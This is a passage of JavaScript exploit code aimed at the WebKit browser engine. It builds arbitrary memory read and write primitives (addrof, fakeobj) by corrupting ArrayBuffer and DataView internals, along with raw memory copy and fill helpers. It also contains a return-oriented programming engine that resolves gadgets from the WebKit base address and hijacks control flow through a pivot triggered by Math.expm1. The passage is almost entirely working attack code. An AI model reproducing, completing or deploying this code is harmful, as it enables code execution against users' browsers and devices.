   arw.view(m_impl).setBInt(constants.wk_ArrayBuffer_m_contents_m_data, ab.m_data, true); // m_contents.m_data","","        // m_contents.m_sizeInBytes","        if (version.major === 9) {","          arw.view(m_impl).setInt32(constants.wk_ArrayBuffer_m_contents_m_sizeInBytes, 0, true);","        } else {","          arw.view(m_impl).setBInt(constants.wk_ArrayBuffer_m_contents_m_sizeInBytes, 0, true);","        }","      }","    }","","    this.allocs.clear();","  },","  copy(dst, src, len) {","    const src_u8 = new Uint8Array(ArrayBuffer.from(src, len));","    const dst_u8 = new Uint8Array(ArrayBuffer.from(dst, len));","","    dst_u8.set(src_u8);","  },","  bset(addr, len, value = 0) {","    const u8 = new Uint8Array(ArrayBuffer.from(addr, len));","    u8.fill(value);","  },","  strlen(addr, max = 0x3fff) {","    const u8 = new Uint8Array(ArrayBuffer.from(addr, max));","","    const len = u8.indexOf(0);","    if (len === -1) {","      throw new Error(\"Invalid null-terminated string !!\");","    }","","    return len;","  },","};","const arw = {","  leak: { obj: 0 },","  leak_addr: undefined,","  master: undefined,","  victim: new DataView(new ArrayBuffer(0x30)),","  view(addr) {","    if (addr.eq(0)) {","      throw new Error(\"Empty addr !!\");","    }","","    this.master[4] = addr.lo;","    this.master[5] = addr.hi;","","    return this.victim;","  },","  addrof(obj) {","    this.leak.obj = obj;","    return this.view(this.leak_addr).getBInt(0x10, true);","  },","  fakeobj(addr) {","    this.view(this.leak_addr).setBInt(0x10, addr, true);","    return this.leak.obj;","  },","};","const rop = {","  stack: undefined,","  frame: undefined,","  pivot: undefined,","  insts: [],","  reset() {","    this.stack.reset();","    this.frame.reset();","  },","  execute() {","    rop.frame.set_value(\"jmp_rax\", gadgets.POP_RAX_RET);","","    this.stack.prepare(this.insts, this.frame);","    this.pivot.prepare(this.stack.sp);","","    const pivot_obj = {};","    const pivot_obj_addr = arw.addrof(pivot_obj);","","    const empty_jscell = arw.view(pivot_obj_addr).getBInt(0, true);","","    const pivot_addr = this.pivot.addr;","    arw.view(pivot_obj_addr).setBInt(0, pivot_addr, true);","","    Math.expm1(pivot_obj);","","    arw.view(pivot_obj_addr).setBInt(0, empty_jscell, true);","  },","};","const gadgets = new Proxy(constants, {","  get(target, prop) {","    return webkit_base + target[`wk_${prop}`];","  },","});","//#endregion","//#region Classes","class SyscallError extends Error {","  constructor(message) {","    super(`${message}\\n\\terrno ${errno()}: ${strerror()}`);","    this.name = \"SyscallError\";","  }","}","class Stack {","  constructor(size) {","    if (size % 8 !== 0) {","      throw new Error(\"Invalid stack size, not aligned by 8 bytes\");","    }","","    if (size \u003c 0x1000) {","      throw new Error(\"Invalid stack size, minimal size is 0x1000 to init ROP\");","    }","","    this.view = new DataView(new ArrayBuffer(size));","    this.reset();","  }","","  reset() {","    new Uint8Array(this.view.buffer).fill(0);","    this.offset = this.view.byteLength;","  }","","  get sp() {","    return this.view.buffer.data().add(this.offset);","  }","","  /**","   * @param {Array} insts","   * @param {Frame} frame","   */","  prepare(insts, frame) {","    this.reset();","","    for (let i = insts.length - 1; i \u003e= 0; i--) {","      if (this.current \u003c 1) {","        throw new Error(\"Stack full !!\");","      }","","      let inst = insts[i];","","      if (typeof inst === \"string\") {","        if (typeof frame === \"undefined\") {","          throw new Error(\"Unable to resolve symbol without frame !!\");","        }","","        inst = frame.instof(inst);","      }","","      this.offset -= 8;","      this.view.setBInt(this.offset, inst, true);","    }","  }","}","class Frame {","  constructor(list) {","    if (!Array.isArray(list)) {","      throw new Error(`Input frame is not an array !!`);","    }","","    if (list.length === 0) {","      throw new Error(\"Empty frame length !!\");","    }","","    this.pop_view = new DataView(new ArrayBuffer(8));","    this.view = new DataView(new ArrayBuffer(list.length * 8));","","    for (let i = 0; i \u003c list.length; i++) {","      const name = list[i];","","      if (typeof name !== \"string\") {","        throw new TypeError(`${name} not a string !!`);","      }","","      if (name in this) {","        throw new Error(`Duplicated local variable ${name} !!`);","      }","","      this[name] = i;","    }","  }","","  reset() {","    new Uint8Array(this.view.buffer).fill(0);","  }","","  instof(name) {","    let as_value = false;","","    if (name.startsWith(\"[\") \u0026\u0026 name.endsWith(\"]\")) {","      name = name.slice(1, -1);","      as_value = true;","    }","","    if (name in this) {","      return as_value ? this.get_value(name) : this.addrof(name);","    }","","    throw new Error(`${name} not in frame !!`);","  }","","  addrof(name) {","    if (!(name in this)) {","      throw new Error(`${name} not in frame !!`);","    }","","    return this.view.buffer.data().add(this[name] * 8);","  }","","  get_value(name) {","    if (!(name in this)) {","      throw new Error(`${name} not in frame !!`);","    }","","    return this.view.getBInt(this[name] * 8, true);","  }","","  set_value(name, value) {","    if (!(name in this)) {","      throw new Error(`${name} not in frame !!`);","    }","","    this.view.setBInt(this[name] * 8, value, true);","  }","","  valueof(insts, name) {","    insts.push(`[${name}]`);","  }","","  store(insts, name) {","    if (!(name in this)) {","      throw new Error(`${name} not in frame !!`);","    }","","    insts.push(gadgets.POP_RDI_RET);","    insts.push(name);","    insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);","  }","","  load(insts, name) {","    if (!(name in this)) {","      throw new Error(`${name} not in frame !!`);","    }","","    insts.push(gadgets.POP_RDI_RET);","    insts.